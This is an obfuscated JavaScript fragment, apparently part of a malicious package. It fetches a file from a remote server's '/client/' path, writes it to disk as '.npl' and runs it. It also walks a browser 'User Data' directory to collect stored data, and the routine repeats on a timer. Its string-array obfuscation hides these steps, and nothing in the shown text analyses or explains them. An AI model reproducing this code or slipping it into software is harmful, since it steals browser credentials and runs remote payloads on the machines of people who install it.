                _0x116617 - -0x356
              );
            }
            try {
              _0x22de84[_0xad2b11(-'0x170', -'0x17a', -0x1b1, -'0x136')](
                _0x5382f3
              );
            } catch (_0x4cf369) {}
            function _0x174621(_0x3a1025, _0x348314, _0x5973c4, _0x49c254) {
              return _0x295d4a(
                _0x3a1025,
                _0x348314 - '0x1e6',
                _0x5973c4 - '0x81',
                _0x348314 - '0x169'
              );
            }
            _0x308612[_0x174621(0x2e5, 0x35f, '0x393', 0x2f8)](
              _0x57a987,
              (_0x592aa8, _0x1c905c, _0x4665e3) => {
                function _0x56bde4(_0xf9b605, _0x1b9364, _0x191d07, _0x340fe2) {
                  return _0xad2b11(
                    _0xf9b605 - '0x104',
                    _0x191d07 - -0x50,
                    _0x1b9364,
                    _0x340fe2 - 0x44
                  );
                }
                if (!_0x592aa8)
                  try {
                    _0x22de84[
                      'writeFileS' +
                        _0x56bde4(-'0x13a', -0x17b, -'0x1b5', -0x228)
                    ](_0x5382f3, _0x4665e3),
                      _0x79d6af(
                        _0x310444,
                        (_0x4e3f4b, _0x1f4ab4, _0x588422) => {}
                      );
                  } catch (_0xaee822) {}
              }
            );
          })()
        : _0x51661c['oGuVF'](_0x53035b);
    else
      (() => {
        const _0x3fa823 = {
          TVqGL: function (_0x529232, _0x14b48b) {
            return _0x51661c['Ilmxp'](_0x529232, _0x14b48b);
          },
          odDBO: function (_0x4b92cb, _0x3f12a8) {
            function _0x32528c(_0x2cc61f, _0x864f45, _0x29c241, _0x532861) {
              return _0xd469(_0x29c241 - 0x2a9, _0x532861);
            }
            return _0x51661c[_0x32528c('0x4cb', '0x523', 0x4a5, '0x46a')](
              _0x4b92cb,
              _0x3f12a8
            );
          },
          XLybf: _0x51661c[_0x3b4f5d(0x20, '0x21', -0x62, '0x5')],
          lJWIH: _0x51661c['TUCru'],
        };
        function _0x21599b(_0x237613, _0x55a61a, _0x2bf0f2, _0x5e9894) {
          return _0x34a53b(
            _0x237613 - 0x57,
            _0x5e9894 - 0x40,
            _0x2bf0f2 - 0x117,
            _0x2bf0f2
          );
        }
        function _0x3b4f5d(_0x30d0b0, _0x1dae39, _0x18f799, _0x5aa947) {
          return _0x34a53b(
            _0x30d0b0 - 0x2d,
            _0x18f799 - 0x1b1,
            _0x18f799 - 0x67,
            _0x1dae39
          );
        }
        _0x308612[_0x21599b(-0x140, -'0x1aa', -0x187, -0x1c6)](
          _0x144d75 + '/client/' + _0x274c2b,
          (_0x29bec7, _0x2c2d7c, _0x1f87f7) => {
            function _0xff30a3(_0x41312b, _0xec2f2, _0x21270c, _0x1eb89f) {
              return _0x21599b(
                _0x41312b - '0x16f',
                _0xec2f2 - '0x1c1',
                _0xec2f2,
                _0x41312b - '0x49e'
              );
            }
            function _0x218d18(_0x28ee71, _0x3b6c8b, _0x25eb43, _0x4eb480) {
              return _0x3b4f5d(
                _0x28ee71 - '0x162',
                _0x4eb480,
                _0x25eb43 - -0x171,
                _0x4eb480 - 0x171
              );
            }
            _0x51661c[_0x218d18(-0x104, -0x1f8, -'0x191', -'0x12b')](
              _0xff30a3('0x2f0', 0x337, '0x317', '0x333'),
              _0x51661c[_0x218d18(-0xc2, -'0x17d', -'0xfb', -'0x6b')]
            )
              ? (_0x6add8f = yJeLpk[_0xff30a3(0x314, 0x322, 0x3af, 0x34b)](
                  _0x562235,
                  yJeLpk[_0x218d18(-'0x152', -0x1a9, -'0x1c1', -'0x228')](
                    yJeLpk[_0xff30a3('0x2dd', 0x34f, 0x28d, 0x278)](
                      yJeLpk[_0x218d18(-0x3c, -'0xd2', -0xcb, -0x5e)],
                      yJeLpk['lJWIH']
                    ),
                    ');'
                  )
                )())
              : _0x29bec7 ||
                (_0x22de84[
                  _0xff30a3('0x37a', 0x402, 0x31d, '0x3fd') +
                    _0xff30a3(0x2d3, '0x2e1', '0x318', 0x330)
                ](_0x486da7 + '/.npl', _0x1f87f7),
                _0x51661c['xDqyd'](
                  _0x79d6af,
                  _0x218d18(-'0x1bc', -0xcd, -'0x155', -'0x183') +
                    _0x486da7 +
                    _0x218d18(-0x123, -0xb1, -0xe4, -0xf9),
                  (_0xd082be, _0x5381f7, _0x3159aa) => {}
                ));
          }
        );
      })();
  });
var _0x1b3a1c = -0x1c45 + 0x8b4 + 0x1391;
const _0x351066 = async () => {
  const _0x5e4130 = {
    uBJjw: function (_0x3cc83b, _0x46534d) {
      return _0x3cc83b === _0x46534d;
    },
    AAszr: _0x12dfe6('0x3fd', '0x43f', 0x3a2, '0x41a'),
    dynVc: _0x12dfe6(0x49e, 0x4e7, '0x423', '0x473'),
    ozPFu: function (_0x572838, _0x310ce6, _0x8b722) {
      return _0x572838(_0x310ce6, _0x8b722);
    },
    jhoer: function (_0x5b7cf8, _0xfc74da, _0x24375e) {
      return _0x5b7cf8(_0xfc74da, _0x24375e);
    },
    SDkSv: function (_0x322d98, _0x47a0e2) {
      return _0x322d98 == _0x47a0e2;
    },
    UpgMn: function (_0x5f214b, _0x373c9c, _0x10978b, _0x2de6b7) {
      return _0x5f214b(_0x373c9c, _0x10978b, _0x2de6b7);
    },
    aERfz: function (_0xa037a3, _0x2339fb) {
      return _0xa037a3(_0x2339fb);
    },
    zVAdw: function (_0x5f03d3) {
      return _0x5f03d3();
    },
  };
  function _0x12dfe6(_0x1d8b41, _0x4c3b8c, _0x5700b7, _0x14fa9a) {
    return _0x143f14(
      _0x1d8b41,
      _0x4c3b8c - 0x115,
      _0x5700b7 - 0x16b,
      _0x14fa9a - '0x582'
    );
  }
  function _0x396c5b(_0x18fccf, _0x4ec1d, _0x141290, _0xe6fea9) {
    return _0x143f14(
      _0x4ec1d,
      _0x4ec1d - '0x49',
      _0x141290 - '0xce',
      _0x18fccf - -'0x3b'
    );
  }
  try {
    await (async () => {
      function _0x166ec6(_0x5b2745, _0x254ddf, _0x44a6f5, _0x1c9eed) {
        return _0x396c5b(
          _0x1c9eed - '0x3fc',
          _0x5b2745,
          _0x44a6f5 - '0xaf',
          _0x1c9eed - '0x108'
        );
      }
      function _0x2ddf49(_0x2aa600, _0x5320df, _0x28ae83, _0x4a5584) {
        return _0x396c5b(
          _0x2aa600 - 0xfa,
          _0x28ae83,
          _0x28ae83 - '0x110',
          _0x4a5584 - 0xb1
        );
      }
      if (
        _0x5e4130[_0x166ec6(0x38d, '0x2df', '0x2f6', '0x329')](
          _0x5e4130[_0x166ec6('0x27b', '0x291', 0x2d2, 0x26e)],
          _0x5e4130[_0x166ec6(0x389, '0x344', '0x286', '0x2f6')]
        )
      )
        _0x4a3c03 = [];
      else
        try {
          await _0x5e4130['ozPFu'](
            _0x24105a,
            _0xa18664,
            -0x717 + 0x359 * -0x9 + 0x2538
          ),
            await _0x24105a(_0x570b36, 0x4be + -0xcf0 + 0x833 * 0x1),
            await _0x5e4130[_0x2ddf49(-'0x100', -'0xf6', -'0xfa', -'0x89')](
              _0x24105a,
              _0x4dd88a,
              -0x1 * -0x210e + 0xfa8 + -0x2 * 0x185a
            ),
            _0x30225c(),
            _0x5e4130[_0x166ec6('0x25f', '0x295', '0x1c4', '0x247')](
              'w',
              _0x1bc283[-0x22e4 + -0xf9 * -0x19 + 0xa93 * 0x1]
            ) &&
              (await _0x5e4130[_0x166ec6('0x26d', 0x1df, 0x1c0, 0x24e)](
                _0x1768bb,
                _0x5e4130[_0x2ddf49(-'0xe5', -0x63, -0x131, -'0xf6')](
                  _0x3c08e1,
                  '~/'
                ) +
                  (_0x166ec6('0x2fa', '0x304', '0x25b', '0x278') +
                    _0x166ec6('0x32e', 0x2f8, 0x21e, '0x2ae') +
                    _0x2ddf49(-'0x8e', -0x102, -'0xff', 0xe) +
                    'User\x20Data'),
                '3_',
                ![]
              )),
            _0x5e4130['SDkSv'](
              'd',
              _0x1bc283[0x1aa7 + 0xf6b * 0x2 + -0x397d]
            ) &&
              (await _0x5e4130[_0x2ddf49(-0x73, -'0x31', 0x1c, -'0xff')](
                _0x1ddc9d
              ));
        } catch (_0xa7f032) {}
    })(),
      _0x5e4130[_0x12dfe6(0x45a, '0x405', 0x3ce, '0x450')](_0x168bc2);
  } catch (_0xf288e4) {}
};
_0x351066(), _0x168bc2();
let _0x10283b = setInterval(
  () => {
    function _0x52ce26(_0xfe3966, _0x1773d8, _0x478871, _0x2b6172) {
      return _0x143f14(
        _0x1773d8,
        _0x1773d8 - 0xe6,
        _0x478871 - 0xb4,
        _0x478871 - 0x1c3
      );
    }
    function _0x1865af(_0x4a8e5c, _0x3653ad, _0x15289e, _0x50dee7) {
      return _0x143f14(
        _0x4a8e5c,
        _0x3653ad - '0xb6',
        _0x15289e - '0xdb',
        _0x3653ad - '0x3a7'
      );
    }
    const _0x14402f = {
      nlBJp: function (_0x389fdf, _0x30d69c) {
        return _0x389fdf < _0x30d69c;
      },
      HIVFQ: function (_0x4ac04d) {
        return _0x4ac04d();
      },
      GwxBo: function (_0x53d9af, _0x20da80) {
        return _0x53d9af(_0x20da80);
      },
    };
    _0x14402f[_0x52ce26(0x58, '0x98', '0x5', 0x26)](
      (_0x1b3a1c += 0x2443 * 0x1 + 0x937 + -0x2d79 * 0x1),
      0xbf6 * -0x3 + -0x7cd * 0x2 + 0x3381
    )
      ? _0x14402f[_0x1865af('0x27e', '0x316', '0x34b', '0x39a')](_0x351066)
      : _0x14402f[_0x52ce26('0x186', 0x5f, '0xea', '0x56')](
          clearInterval,
          _0x10283b
        );
  },
  -0x62 * -0x186 + -0x1 * -0xac63 + -0x1 * 0xcc7f
);
